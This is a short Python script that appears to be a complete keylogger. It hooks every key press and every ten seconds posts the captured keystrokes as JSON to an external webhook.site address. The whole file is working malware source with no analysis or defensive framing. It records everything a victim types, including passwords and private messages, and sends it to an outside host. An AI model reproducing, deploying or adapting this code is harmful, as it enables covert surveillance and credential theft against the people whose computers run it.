import keyboard
import requests
import json
import threading

logged_keystrokes = ""
webhookUrl = "https://webhook.site/5eb26f68-3adb-457a-9706-adf63da9b55c"
logging_interval = 10

def send_post_req():
    global logged_keystrokes
    try:
        payload = json.dumps({"Keyboard input": logged_keystrokes})
        requests.post(f"{webhookUrl}", data=payload, headers={"Content-Type": "application/json"})
        logged_keystrokes = ""  
        timer = threading.Timer(logging_interval, send_post_req)
        timer.start()
    except:
        print("Couldn't complete request!")

def log_keys(e):
    global logged_keystrokes
    if len(e.name) > 1:
        logged_keystrokes += f"<{e.name}>"
    else:
        logged_keystrokes += e.name

keyboard.on_press(log_keys)

send_post_req()
keyboard.wait()  
